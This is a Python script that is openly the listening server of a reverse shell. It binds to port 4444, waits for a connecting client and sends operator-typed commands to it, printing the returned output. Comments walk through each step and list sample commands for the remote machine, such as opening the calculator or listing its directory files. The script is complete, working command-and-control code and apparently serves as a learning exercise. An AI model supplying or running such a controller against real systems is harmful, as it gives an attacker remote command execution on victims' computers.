import sys
import socket

SERVER_IP = "127.0.0.1"
PORT = 4444

# CREATES A SOCKET OBJECT FOR THE NETWORK STACK
s = socket.socket()

# CHANGE SOCKET OPTIONS
# SOL_SOCKET = change settings at socket level
# SO_REUSEADDR = local ip address can be changed with bind()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER_IP, PORT))

s.listen(1)  # WAIT FOR NEW CONNECTION

while True:  # OPEN A NEW CONNECTION
    print(f'[+] listening as {SERVER_IP}:{PORT}')

    client = s.accept()  # ACCEPT NEW CONNECTION
    print(f'[+] client command {client[1]}')  # CLIENT DETAILS

    client[0].send('connected'.encode())  # SEND COMMAND TO CLIENT
    while True:
        cmd = input('>>> ')
        client[0].send(cmd.encode())  # ENCODE FOR TRANSPORT - PROTOCOL

        if cmd.lower() in ['quit', 'exit', 'q', 'x']:  # command to exit reverse shell
            break

        result = client[0].recv(1024).decode()  # RESPONSE FROM CLIENT
        print(result)

    client[0].close()  # END  TRANSMISSION

    cmd = input('wait for new client y/n ') or 'y'  # REPEAT THE PROCESS
    if cmd.lower() in ['n', 'no']:
        break

s.close()  # destroy socket obect and close app

# calc  = opens calculator
# rick roll = start https://www.youtube.com/watch?v=xvFZjo5PgG0
# dir = list machines directory files
